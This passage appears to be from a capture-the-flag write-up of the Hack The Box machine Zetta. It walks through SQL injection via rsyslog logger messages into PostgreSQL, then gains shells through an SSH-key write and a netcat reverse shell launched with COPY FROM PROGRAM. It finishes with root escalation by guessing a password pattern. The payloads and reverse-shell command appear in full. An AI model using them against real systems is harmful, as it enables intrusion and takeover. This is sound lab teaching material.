+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">git show</code> gives me the last committed version of the config:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/etc/rsyslog.d$ </span>git show e25cc20218f99abd68a2bf06ebfa81cd7367eb6a:pgsql.conf
+<span class="c">### Configuration file for rsyslog-pgsql
+### Changes are preserved
+</span><span class="go">
+</span><span class="c"># https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
+#
+# Used default template from documentation/source but adapted table
+# name to syslog_lines so the Ruby on Rails application Maurice is
+# coding can use this as SyslogLine object.
+#
+</span><span class="go">template(name="sql-syslog" type="list" option.sql="on") {
+  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
+  property(name="msg")
+  constant(value="','")
+  property(name="timereported" dateformat="pgsql" date.inUTC="on")
+  constant(value="')")
+}
+
+</span><span class="c"># load module
+</span><span class="go">module(load="ompgsql")
+
+</span><span class="c"># Only forward local7.info for testing.
+</span><span class="go">local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
+</span></code></pre></div></div>
+<h3 id="syslog-config">SYSLOG Config</h3>
+<p>The first thing that I notice is the credentials. Unfortunately, they don’t work to connect to the db:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/etc/rsyslog.d$ </span>psql syslog postgres <span class="nt">-W</span>
+<span class="go">Password: 
+psql: FATAL:  Peer authentication failed for user "postgres"
+</span></code></pre></div></div>
+<p>There are still a couple bits of information that are useful to understand from this config.</p>
+<p>The first is the template. It is taking items that are pushed to Syslog and transforming them into a database query. Looking at it, this seems like an opportunity for SQL injection. The query turns out to be:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">syslog_lines</span> <span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">devicereportedtime</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">'[msg]'</span><span class="p">,</span><span class="s1">'[date]'</span><span class="p">);</span>
+</code></pre></div></div>
+<p>If I can find a way to control the <code class="language-plaintext highlighter-rouge">msg</code>, I can try to inject.</p>
+<p>There’s also a line at the bottom about <code class="language-plaintext highlighter-rouge">local7.info</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Only forward local7.info for testing.</span>
+local7.info action<span class="o">(</span><span class="nb">type</span><span class="o">=</span><span class="s2">"ompgsql"</span> <span class="nv">server</span><span class="o">=</span><span class="s2">"localhost"</span> <span class="nv">user</span><span class="o">=</span><span class="s2">"postgres"</span> <span class="nv">pass</span><span class="o">=</span><span class="s2">"test1234"</span> <span class="nv">db</span><span class="o">=</span><span class="s2">"syslog"</span> <span class="nv">template</span><span class="o">=</span><span class="s2">"sql-syslog"</span><span class="o">)</span>
+</code></pre></div></div>
+<p>Since this setup is still in testing, Zetta is only using this test channel right now. I can write to this channel using <code class="language-plaintext highlighter-rouge">logger</code>. On the <a href="http://man7.org/linux/man-pages/man1/logger.1.html">man page</a>, I’ll see <code class="language-plaintext highlighter-rouge">-p</code>:</p>
+<blockquote>
+<p>-p, –priority priority
+              Enter the message into the log with the specified priority.  The priority may be specified numerically or as a facility.level pair.  For example, -p local3.info logs the message as informational in the local3 facility.  The default is user.notice.</p>
+</blockquote>
+<p>Later on that same page there’s:</p>
+<blockquote>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FACILITIES AND LEVELS
+       Valid facility names are:
+          auth
+          authpriv   for security information of a sensitive nature
+          cron
+          daemon
+          ftp
+          kern       cannot be generated from userspace process, automatically converted to user
+          lpr
+          mail
+          news
+          syslog
+          user
+          uucp
+          local0
+            to
+          local7
+          security   deprecated synonym for auth
+
+   Valid level names are:
+
+          emerg
+          alert
+          crit
+          err
+          warning
+          notice
+          info
+          debug
+          panic     deprecated synonym for emerg
+          error     deprecated synonym for err
+          warn      deprecated synonym for warning
+
+   For the priority order and intended purposes of these facilities and levels, see syslog(3).
+</code></pre></div> </div>
+</blockquote>
+<h3 id="test-log-writing">Test Log Writing</h3>
+<p>So <code class="language-plaintext highlighter-rouge">local7.info</code>  is a testing log I can write to with <code class="language-plaintext highlighter-rouge">logger</code>.</p>
+<p>I can test this:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/etc/rsyslog.d$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"test"</span>
+</code></pre></div></div>
+<p>I get no feedback. And since I can’t see the database, I don’t know if that worked. But roy is a member of the <code class="language-plaintext highlighter-rouge">adm</code> group, so I can read logs. I’ll connect another SSH session and use one to write logs, and another to <code class="language-plaintext highlighter-rouge">tail -f postgresql-11-main.log</code> to see new output. This log starts empty, and only failed queries will go in. Now seems like a good time to check for SQLi. I’ll add a <code class="language-plaintext highlighter-rouge">'</code> to the end of my message:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"test'"</span>
+</code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span><span class="nb">tail</span> <span class="nt">-f</span> postgresql-11-main.log
+<span class="go">2019-09-01 13:47:56.585 EDT [13852] postgres@syslog ERROR:  syntax error at or near "2019" at character 75
+2019-09-01 13:47:56.585 EDT [13852] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' test\'','2019-09-01 17:47:56')
+2019-09-01 13:47:56.594 EDT [15468] postgres@syslog ERROR:  syntax error at or near "2019" at character 75
+2019-09-01 13:47:56.594 EDT [15468] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' test\'','2019-09-01 17:47:56')
+2019-09-01 13:47:56.599 EDT [15469] postgres@syslog WARNING:  there is no transaction in progress
+</span></code></pre></div></div>
+<p>It worked!</p>
+<h3 id="sqli---poc">SQLI - POC</h3>
+<p>To get this to an injection, I need to try to get a query that is accepted. I notice that syslog is escaping my <code class="language-plaintext highlighter-rouge">'</code> with a <code class="language-plaintext highlighter-rouge">\</code>, but then <code class="language-plaintext highlighter-rouge">postgres</code> is seeing it as a string, so the next <code class="language-plaintext highlighter-rouge">'</code> breaks it. I’ll try to use comments to get rid of that issue. Eventually I find a query that doesn’t generate a log:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"test', null)-- -"</span>
+</code></pre></div></div>
+<p>If I put this into the template, it would look like:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">syslog_lines</span> <span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">devicereportedtime</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">'test'</span><span class="p">,</span> <span class="k">null</span><span class="p">)</span><span class="c1">-- -','[date]');</span>
+</code></pre></div></div>
+<p>Now I want to test for stacked queries, which is the ability to add a <code class="language-plaintext highlighter-rouge">;</code> and then another statement in the same statement. I’ll run two queries:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"test', null); select * from syslog_lines;-- -"</span>
+<span class="gp">roy@zetta:/var/log/postgresql$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"test', null); select * from notatable; -- -"</span>
+</code></pre></div></div>
+<p>The first one doesn’t generate any error, but the second one does because “notatable” does not exist:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2019-09-01 13:54:43.680 EDT [15533] postgres@syslog ERROR:  relation "notatable" does not exist at character 95
+2019-09-01 13:54:43.680 EDT [15533] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' test\', null); select * from notatable; -- -','2019-09-01 17:54:43')
+2019-09-01 13:54:43.686 EDT [15537] postgres@syslog ERROR:  relation "notatable" does not exist at character 95
+2019-09-01 13:54:43.686 EDT [15537] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' test\', null); select * from notatable; -- -','2019-09-01 17:54:43')
+2019-09-01 13:54:43.691 EDT [15538] postgres@syslog WARNING:  there is no transaction in progress
+</code></pre></div></div>
+<p>So stacked queries are enabled.</p>
+<p>The last thing I want to check is if I can write a file. I start with this query:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"sd',null); COPY (SELECT * from syslog_lines) To '/tmp/output.csv' With CSV;-- -"</span>
+</code></pre></div></div>
+<p>But it returns an error:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2019-09-01 14:03:21.069 EDT [15659] postgres@syslog ERROR:  syntax error at or near "\" at character 115
+2019-09-01 14:03:21.069 EDT [15659] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' sd\',null); COPY (SELECT * from syslog_lines) To \'/tmp/output.csv\' With CSV;-- -','2019-09-01 18:03:21')
+</code></pre></div></div>
+<p>The escaped quotes outside of <code class="language-plaintext highlighter-rouge">' '</code> are causing issues. I then tried without <code class="language-plaintext highlighter-rouge">''</code> around the filename, but it errored as well. Some googling for “postgres quote alternative” led me to the <a href="https://www.postgresql.org/docs/9.1/sql-syntax-lexical.html">Postgres Lexical Structure</a>, where I see that <code class="language-plaintext highlighter-rouge">$$</code> is an alternative for single quote. I try that:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"sd',null); COPY (SELECT * from syslog_lines) To </span><span class="nv">$$</span><span class="s2">/tmp/output.csv</span><span class="nv">$$</span><span class="s2"> With CSV;-- -"</span>
+</code></pre></div></div>
+<p>Another error:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2019-09-01 14:07:05.018 EDT [15701] postgres@syslog ERROR:  syntax error at or near "14194" at character 115
+2019-09-01 14:07:05.018 EDT [15701] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' sd\',null); COPY (SELECT * from syslog_lines) To 14194/tmp/output.csv14194 With CSV;-- -','2019-09-01 18:07:05')
+</code></pre></div></div>
+<p>This is interesting, because the <code class="language-plaintext highlighter-rouge">$$</code> seems to have reached bash, where it was evaluated as the current pid. I try now to escape those:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"sd',null); COPY (SELECT * from syslog_lines) To </span><span class="se">\$</span><span class="nv">$/</span><span class="s2">tmp/output.csv</span><span class="se">\$</span><span class="nv">$ </span><span class="s2">With CSV;-- -"</span>
+</code></pre></div></div>
+<p>No error. And I see a table dump in <code class="language-plaintext highlighter-rouge">/tmp/output.csv</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3,,,,,,, test message\\\,,,,,,,,,,,,,,,,
+4,,,,,,, test message\\\,,,,,,,,,,,,,,,,
+5,,,,,,, test message\\\,,,,,,,,,,,,,,,,
+8,,,2019-09-01 14:48:17,,,," test message13348,null); select * from syslog_liness --",,,,,,,,,,,,,,,,
+9,,,2019-09-01 14:48:35,,,," test13348, 13348test13348); --",,,,,,,,,,,,,,,,
+10,,,2019-09-01 14:48:38,,,," test13348, 13348test13348); s--",,,,,,,,,,,,,,,,
+11,,,2019-09-01 14:48:46,,,," test13348, 13348test13348); s--",,,,,,,,,,,,,,,,
+12,,,2019-09-01 14:48:56,,,," test13348, 13348test13348); s--",,,,,,,,,,,,,,,,
+13,,,2019-09-01 14:50:00,,,, $,,,,,,,,,,,,,,,,
+14,,,2019-09-01 14:50:08,,,, 13348,,,,,,,,,,,,,,,,
+15,,,,,,, \\\,,,,,,,,,,,,,,,,
+16,,,,,,, \\\,,,,,,,,,,,,,,,,
+19,,,,,,, sd\\\,,,,,,,,,,,,,,,,
+22,,,,,,, sd\\\,,,,,,,,,,,,,,,,
+23,,,,,,, sd\\\,,,,,,,,,,,,,,,,
+24,,,,,,, sd\\\,,,,,,,,,,,,,,,,
+25,,,,,,, sd\\\,,,,,,,,,,,,,,,,
+26,,,,,,, sd\\\,,,,,,,,,,,,,,,,
+31,,,,,,, sd\\\,,,,,,,,,,,,,,,,
+32,,,,,,, sd\\\,,,,,,,,,,,,,,,,
+33,,,2019-09-01 17:45:02,,,, test,,,,,,,,,,,,,,,,
+34,,,,,,, test\,,,,,,,,,,,,,,,,
+35,,,,,,, test\,,,,,,,,,,,,,,,,
+36,,,,,,, test\,,,,,,,,,,,,,,,,
+37,,,,,,, test\,,,,,,,,,,,,,,,,
+38,,,,,,, test\,,,,,,,,,,,,,,,,
+41,,,,,,, test\,,,,,,,,,,,,,,,,
+44,,,,,,, sd\,,,,,,,,,,,,,,,,
+45,,,,,,, sd\,,,,,,,,,,,,,,,,
+</code></pre></div></div>
+<p>I can add a error after the last <code class="language-plaintext highlighter-rouge">;</code> to get it to dump what it’s seeing:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2019-09-01 14:11:34.881 EDT [15740] postgres@syslog ERROR:  syntax error at or near "0" at character 144
+2019-09-01 14:11:34.881 EDT [15740] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' sd\',null); COPY (SELECT * from syslog_lines) To $$/tmp/output.csv$$ With CSV;0xdf-- -','2019-09-01 18:11:34')
+</code></pre></div></div>
+<p>The escaped <code class="language-plaintext highlighter-rouge">$</code> worked!</p>
+<h3 id="shell">Shell</h3>
+<p>There are a few ways to go from this injection to a shell. I’ll show two.</p>
+<h4 id="write-an-ssh-key">Write an SSH Key</h4>
+<p>In <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, the postgres user has a shell and a home directory:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+</code></pre></div></div>
+<p>And, the home dir has a <code class="language-plaintext highlighter-rouge">.ssh</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span><span class="nb">ls</span> <span class="nt">-la</span> /var/lib/postgresql/
+<span class="go">total 24
+drwxr-xr-x  4 postgres postgres 4096 Sep  1 11:16 .
+drwxr-xr-x 27 root     root     4096 Aug 27 05:39 ..
+drwxr-xr-x  3 postgres postgres 4096 Jul 27 03:07 11
+lrwxrwxrwx  1 root     root        9 Jul 27 06:57 .bash_history -&gt; /dev/null
+-rw-------  1 postgres postgres   32 Sep  1 11:16 .lesshst
+-rw-------  1 postgres postgres  744 Jul 27 07:01 .psql_history
+drwx------  2 postgres postgres 4096 Jul 27 06:40 .ssh
+</span></code></pre></div></div>
+<p>I can, with three queries to the database, write my public key file into <code class="language-plaintext highlighter-rouge">.ssh/authorized_keys</code>, and then ssh into the box as postgres.</p>
+<p>The three queries are:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">CREATE TABLE IF NOT EXISTS oxdf (mycol text);</code></li>
+<li><code class="language-plaintext highlighter-rouge">INSERT INTO oxdf(mycol) VALUES (\$$ ssh-rsa AAAAB3NzaC...[snip]...YQC3rRDiG5P root@kali\$$);</code></li>
+<li><code class="language-plaintext highlighter-rouge">COPY (SELECT * from oxdf) To \$$/var/lib/postgresql/.ssh/authorized_keys\$$;</code></li>
+</ul>
+<p>The first create a table. The next puts my key into it. The final one writes that to a file. I can stack that all together and run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"sd',null); CREATE TABLE IF NOT EXISTS aaa (mycol text); INSERT INTO aaa(mycol) VALUES (</span><span class="se">\$</span><span class="nv">$ </span><span class="s2">ssh-rsa AAAAB3NzaC...[snip]...YQC3rRDiG5P root@kali</span><span class="se">\$</span><span class="nv">$)</span><span class="s2">; COPY (SELECT * from aaa) To </span><span class="se">\$</span><span class="nv">$/</span><span class="s2">var/lib/postgresql/.ssh/author
+</span><span class="go">ized_keys\$$;-- -"
+</span></code></pre></div></div>
+<p>Now I can ssh in as postgres:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ssh <span class="nt">-i</span> ~/id_rsa_generated postgres@10.10.10.156
+<span class="go">Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
+Last login: Sun Sep  1 11:07:12 2019 from 10.10.14.5
+</span><span class="gp">postgres@zetta:~$ </span><span class="w">
+</span></code></pre></div></div>
+<h4 id="run-a-reverse-shell">Run a Reverse Shell</h4>
+<p>This is how jkr told me he planned for it to be solved in writing the box. I can run code directly from <code class="language-plaintext highlighter-rouge">postgres</code>. So I’ll write a script that will give me a shell. Since this box has limited options, the best path is to upload a copy of <code class="language-plaintext highlighter-rouge">nc</code>. (I played with trying to get a <code class="language-plaintext highlighter-rouge">python</code> reverse shell to stay connected more than 10 seconds, but couldn’t get it.)  I’ll grab a <a href="https://github.com/ZephrFish/static-tools/blob/master/ncat">statically compiled ncat</a> and upload it over <code class="language-plaintext highlighter-rouge">scp</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>scp <span class="nt">-i</span> ~/id_rsa_generated nc roy@10.10.10.156:/tmp/nc
+</code></pre></div></div>
+<p>Now I can inject code that will call it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"sd',null); CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM </span><span class="se">\$</span><span class="nv">$/</span><span class="s2">tmp/nc -e /bin/sh 10.10.14.5 443</span><span class="se">\$</span><span class="nv">$;</span><span class="s2"> -- "</span>                                                                                     
+</code></pre></div></div>
+<p>No errors, and a callback:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.156.
+Ncat: Connection from 10.10.10.156:33972.
+id
+uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
+</span></code></pre></div></div>
+<p>Except after 10 seconds, the connection dies, and errors:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2019-09-01 15:16:22.595 EDT [16482] postgres@syslog ERROR:  program "/tmp/nc -e /bin/sh 10.10.14.5 443" failed
+2019-09-01 15:16:22.595 EDT [16482] postgres@syslog DETAIL:  child process exited with exit code 1
+2019-09-01 15:16:22.595 EDT [16482] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' sd\',null); CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM $$/tmp/nc -e /bin/sh 10.10.14.5 443$$; -- ','2019-09-0
+1 19:16:12')
+</code></pre></div></div>
+<p>This is likely the result of a timeout in the database. I’ll run it again, with <code class="language-plaintext highlighter-rouge">nc</code> in the background:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/var/log/postgresql$ </span>logger <span class="nt">-p</span> local7.info <span class="s2">"sd',null); CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM </span><span class="se">\$</span><span class="nv">$/</span><span class="s2">tmp/nc -e /bin/sh 10.10.14.5 443 &amp; </span><span class="se">\$</span><span class="nv">$;</span><span class="s2"> -- "</span>
+</code></pre></div></div>
+<p>No errors, and the shell works!</p>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>Either way, I’m on as postgres. In the home directory, there’s a couple history files that aren’t redirected to <code class="language-plaintext highlighter-rouge">/dev/null</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">postgres@zetta:/var/lib/postgresql$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 24
+drwxr-xr-x  4 postgres postgres 4096 Sep  1 11:16 .
+drwxr-xr-x 27 root     root     4096 Aug 27 05:39 ..
+drwxr-xr-x  3 postgres postgres 4096 Jul 27 03:07 11
+lrwxrwxrwx  1 root     root        9 Jul 27 06:57 .bash_history -&gt; /dev/null
+-rw-------  1 postgres postgres   32 Sep  1 11:16 .lesshst
+-rw-------  1 postgres postgres  744 Jul 27 07:01 .psql_history
+drwx------  2 postgres postgres 4096 Sep  1 14:47 .ssh
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">.lesshst</code> file isn’t that interesting, but there’s a password in <code class="language-plaintext highlighter-rouge">.psql_history</code>:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">postgres</span><span class="o">@</span><span class="n">zetta</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="err">$</span> <span class="n">cat</span> <span class="p">.</span><span class="n">psql_history</span> 
+<span class="k">CREATE</span> <span class="k">DATABASE</span> <span class="n">syslog</span><span class="p">;</span>
+<span class="err">\</span><span class="k">c</span> <span class="n">syslog</span>
+<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">syslog_lines</span> <span class="p">(</span> <span class="n">ID</span> <span class="nb">serial</span> <span class="k">not</span> <span class="k">null</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span> <span class="n">CustomerID</span> <span class="nb">bigint</span><span class="p">,</span> <span class="n">ReceivedAt</span> <span class="nb">timestamp</span> <span class="k">without</span> <span class="nb">time</span> <span class="k">zone</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">DeviceReportedTime</span> <span class="nb">timestamp</span> <span class="k">without</span> <span class="nb">time</span> <span class="k">zone</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">Facility</span> <span class="nb">smallint</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">Priority</span> <span class="nb">smallint</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">FromHost</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">Message</span> <span class="nb">text</span><span class="p">,</span> <span class="n">NTSeverity</span> <span class="nb">int</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">Importance</span> <span class="nb">int</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">EventSource</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">EventUser</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">EventCategory</span> <span class="nb">int</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">EventID</span> <span class="nb">int</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">EventBinaryData</span> <span class="nb">text</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">MaxAvailable</span> <span class="nb">int</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">CurrUsage</span> <span class="nb">int</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">MinUsage</span> <span class="nb">int</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">MaxUsage</span> <span class="nb">int</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">InfoUnitID</span> <span class="nb">int</span> <span class="k">NULL</span> <span class="p">,</span> <span class="n">SysLogTag</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">EventLogType</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">GenericFileName</span> <span class="nb">VarChar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">SystemID</span> <span class="nb">int</span> <span class="k">NULL</span><span class="p">);</span>
+<span class="err">\</span><span class="n">d</span> <span class="n">syslog_lines</span>
+<span class="k">ALTER</span> <span class="k">USER</span> <span class="n">postgres</span> <span class="k">WITH</span> <span class="n">PASSWORD</span> <span class="s1">'sup3rs3cur3p4ass@postgres'</span><span class="p">;</span>
+</code></pre></div></div>
+<h3 id="su">su</h3>
+<p>This is where I recall the note earlier about a password scheme. Immediately I’ll try <code class="language-plaintext highlighter-rouge">su</code>. On entering the password “sup3rs3cur3p4ass@root”, I’m root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">postgres@zetta:/var/lib/postgresql$ </span>su -
+<span class="go">Password: 
+</span><span class="gp">root@zetta:~# </span><span class="w">
+</span></code></pre></div></div>
+<p>And can grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@zetta:~# </span><span class="nb">cat </span>root.txt
+<span class="go">b9407e83************************
+</span></code></pre></div></div>
+<h2 id="beyond">Beyond</h2>
+<h3 id="ftp-module">FTP module</h3>
+<p>I was curious how jkr implemented the auth that allows any 32 character username and password as long as they match. Poking around the configs, there is this <code class="language-plaintext highlighter-rouge">auth</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@zetta:/etc/pure-ftpd/auth# </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 8
+drwxr-xr-x 2 root root 4096 Jul 27 03:15 .
+drwxr-xr-x 6 root root 4096 Jul 27 03:11 ..
+lrwxrwxrwx 1 root root   15 Jul 27 03:15 10ext -&gt; ../conf/ExtAuth
+lrwxrwxrwx 1 root root   26 Jan 28  2019 65unix -&gt; ../conf/UnixAuthentication
+lrwxrwxrwx 1 root root   25 Jan 28  2019 70pam -&gt; ../conf/PAMAuthentication
+</span><span class="gp">root@zetta:/etc/pure-ftpd/auth# </span><span class="nb">cat </span>10ext
+<span class="go">/var/run/ftpd.sock
+</span><span class="gp">root@zetta:/etc/pure-ftpd/auth# </span><span class="nb">cat </span>65unix
+<span class="go">no
+</span><span class="gp">root@zetta:/etc/pure-ftpd/auth# </span><span class="nb">cat </span>70pam
+<span class="go">no
+</span></code></pre></div></div>
+<p>The 10ext points to a unix socket file.</p>
+<p>In the process list, there is both the FTP server as well as <code class="language-plaintext highlighter-rouge">pure-authd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@zetta:/etc/pure-ftpd/conf# </span>ps auxwww | <span class="nb">grep </span>pure
+<span class="go">root       445  0.0  0.1   9516  3340 ?        S    Aug31   0:00 /usr/sbin/pure-authd -s /var/run/ftpd.sock -r /usr/bin/pure-auth-handler
+root       468  0.0  0.1   9764  2176 ?        Ss   Aug31   0:00 pure-ftpd (SERVER)
+</span></code></pre></div></div>
+<p><a href="https://linux.die.net/man/8/pure-authd">pure-authd</a> is an external authentication agent for Pure-FTPd. Looking at the options in the running command line, <code class="language-plaintext highlighter-rouge">-s</code> is a path to the local unix socket, which matches the socket from the FTP server auth directory. <code class="language-plaintext highlighter-rouge">-r</code> is the path to the authentication program. That is where the logic is applied:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@zetta:/etc/pure-ftpd/conf# </span><span class="nb">cat</span> /usr/bin/pure-auth-handler 
+<span class="c">#!/bin/bash
+</span><span class="go">
+</span><span class="gp">if [[ $AUTHD_ACCOUNT =~ ^[[:alnum:]]{32}$ </span><span class="o">&amp;&amp;</span> <span class="s2">"</span><span class="nv">$AUTHD_ACCOUNT</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"</span><span class="nv">$AUTHD_PASSWORD</span><span class="s2">"</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
+<span class="go">  echo 'auth_ok:1'
+  echo 'uid:65534'
+  echo 'gid:65534'
+  echo 'dir:/srv/ftp/home/'$AUTHD_ACCOUNT
+else
+  echo 'auth_ok:0'
+fi
+echo 'end'
+</span></code></pre></div></div>
+<p>The first <code class="language-plaintext highlighter-rouge">if</code> line checks that the account is any 32 characters and that the account name and account password are the same. If so, it sets the authentication to successful, assigns the userid and groupid, and sets the home directory in <code class="language-plaintext highlighter-rouge">/srv/ftp/home/</code>. I can see all the created homedirs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@zetta:/srv/ftp/home# </span><span class="nb">ls</span>
+<span class="go">11111111111111111111111111111111  9ieeM1ALgGWzPC0xCXyDNi5jVyXTgedm  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  CUe1tJrwFC9uiPWBZBfemCxH1Qcyg07h  NjPOiShO15rLL1GctBkDOpoDxpzXBcEo  SyuXvjLU3vbAuvstLMnJgXWLkTp0dI1s
